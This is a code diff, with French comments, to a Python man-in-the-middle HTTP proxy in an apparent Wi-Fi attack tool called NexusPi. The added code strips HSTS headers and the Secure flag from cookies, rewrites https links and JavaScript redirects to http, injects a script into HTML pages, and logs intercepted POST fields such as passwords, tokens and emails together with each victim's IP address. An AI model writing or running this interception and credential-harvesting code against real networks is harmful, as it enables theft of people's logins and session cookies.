@@ -29,16 +29,37 @@ PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
 INJECT_SCRIPT = sys.argv[2] if len(sys.argv) > 2 else "alert('NexusPi MITM')"
 INJECTION_TAG = f"<script>{INJECT_SCRIPT}</script>".encode("utf-8") if INJECT_SCRIPT else b""
 
-# SSL strip optionnel : rewrite https:// → http:// dans les liens HTML.
+# SSLstrip2 : rewrite https:// → http:// dans les liens + attributs HTML.
 # Active via env NEXUSPI_STRIP_HTTPS=1 (passé par wifi.py si l'utilisateur
-# coche "SSL strip" en mode MITM). Limité par HSTS — les gros sites résistent.
+# coche "SSL strip" en mode MITM). Limité par HSTS preload — les gros sites
+# préchargés (google, facebook, twitter…) résistent.
+import json
 import os
 import re
+import time
 STRIP_HTTPS = os.environ.get("NEXUSPI_STRIP_HTTPS") == "1"
-_HTTPS_HREF_RE = re.compile(
-    rb'(<a\s[^>]*href\s*=\s*["\'])https://([^"\'\s>]+)',
+CRED_LOG = os.environ.get("NEXUSPI_CRED_LOG", "")
+
+# Couvre <a href>, <form action>, <link href>, <script src>, <img src>, etc.
+_HTTPS_ATTR_RE = re.compile(
+    rb'((?:href|src|action|content|srcset|poster|data|formaction)'
+    rb'\s*=\s*["\'])'
+    rb'https://',
     re.IGNORECASE,
 )
+# JS assignments : window.location = "https://..."
+_HTTPS_JS_RE = re.compile(
+    rb'((?:window|document|self|top|parent)\.(?:location|href|src)'
+    rb'\s*=\s*["\'])'
+    rb'https://',
+    re.IGNORECASE,
+)
+# Champs de credentials à logger
+_CRED_FIELDS = {
+    "password", "passwd", "pass", "pwd", "mot_de_passe",
+    "wifi_password", "secret", "token", "login", "username",
+    "user", "email", "mail", "identifiant",
+}
 
 # Linux netfilter : valeur de SO_ORIGINAL_DST
 SO_ORIGINAL_DST = 80
@@ -139,6 +160,28 @@ def handle_client(client_sock):
         except Exception:
             pass
 
+        # ★ Logger les POST contenant des credentials (HTTP uniquement)
+        if CRED_LOG and request.startswith(b"POST "):
+            try:
+                hdr_e = request.find(b"\r\n\r\n")
+                if hdr_e > 0:
+                    post_body = request[hdr_e + 4:].decode("utf-8", errors="replace")
+                    from urllib.parse import parse_qs
+                    parsed = parse_qs(post_body)
+                    creds = {}
+                    for k, v in parsed.items():
+                        if any(cf in k.lower() for cf in _CRED_FIELDS):
+                            creds[k] = v[0] if v else ""
+                    if creds:
+                        client_ip = client_sock.getpeername()[0]
+                        with open(CRED_LOG, "a", encoding="utf-8") as f:
+                            f.write(f"{time.strftime('%Y-%m-%dT%H:%M:%S')}\t"
+                                    f"{client_ip}\tMITM_CRED\t"
+                                    f"{json.dumps({'host': dst_ip, **creds}, ensure_ascii=False)}\t"
+                                    f"http-proxy\n")
+            except Exception:
+                pass
+
         # ★ Forcer Connection: close pour que le serveur ferme dès la réponse
         # finie (sinon keep-alive → on attend le timeout, 10s par requête).
         hdr_end = request.find(b"\r\n\r\n")
@@ -187,12 +230,29 @@ def handle_client(client_sock):
         headers_blob = response[:hdr_end]
         body = response[hdr_end + 4:]
 
-        # 5. Modifications si HTML : SSL strip + Injection
+        # 5. Modifications si HTML : SSLstrip2 + Injection
         if is_html_response(headers_blob):
             modified = False
-            # SSL strip : rewrite https:// → http:// dans les <a href>
+            # SSLstrip2 : retirer HSTS, Secure cookies, rewrite https → http
             if STRIP_HTTPS:
-                new_body = _HTTPS_HREF_RE.sub(rb'\1http://\2', body)
+                # Retirer Strict-Transport-Security du header
+                new_hdrs = []
+                for h in headers_blob.split(b"\r\n"):
+                    lh = h.lower()
+                    if lh.startswith(b"strict-transport-security:"):
+                        modified = True
+                        continue
+                    # Retirer flag Secure des cookies
+                    if lh.startswith(b"set-cookie:"):
+                        h = re.sub(rb';\s*[Ss]ecure', b'', h)
+                        modified = True
+                    new_hdrs.append(h)
+                if modified:
+                    headers_blob = b"\r\n".join(new_hdrs)
+                # Rewrite tous les attributs HTML https → http
+                new_body = _HTTPS_ATTR_RE.sub(rb'\1http://', body)
+                # Rewrite JS assignments
+                new_body = _HTTPS_JS_RE.sub(rb'\1http://', new_body)
                 if new_body != body:
                     body = new_body
                     modified = True
